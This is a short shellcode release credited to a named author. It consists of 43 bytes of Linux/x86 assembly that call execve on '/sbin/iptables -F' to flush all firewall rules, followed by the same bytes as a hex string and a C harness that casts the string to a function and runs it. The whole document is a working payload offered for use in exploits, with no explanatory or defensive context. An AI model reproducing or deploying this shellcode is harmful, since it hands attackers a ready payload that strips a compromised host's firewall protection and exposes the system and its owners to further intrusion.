/*
    *****************************************************
    *    Linux/x86 iptables --flush 43 bytes 	        *
    *****************************************************
    *	  	  Author: Hamza Megahed		        *
    *****************************************************
    *             Twitter: @Hamza_Mega                  *
    *****************************************************
    *     blog: hamza-mega[dot]blogspot[dot]com         *
    *****************************************************
    *   E-mail: hamza[dot]megahed[at]gmail[dot]com      *
    *****************************************************
*/

xor    %eax,%eax
push   %eax
pushw  $0x462d
movl   %esp,%esi
pushl  %eax
pushl  $0x73656c62
pushl  $0x61747069
pushl  $0x2f6e6962
pushl  $0x732f2f2f
mov    %esp,%ebx
pushl  %eax
pushl  %esi
pushl  %ebx
movl   %esp,%ecx
mov    %eax,%edx
mov    $0xb,%al
int    $0x80

********************************
#include <stdio.h>
#include <string.h>

char *shellcode = "\x31\xc0\x50\x66\x68\x2d\x46\x89\xe6\x50\x68\x62\x6c\x65\x73"
		  "\x68\x69\x70\x74\x61\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f"
		  "\x73\x89\xe3\x50\x56\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";


int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}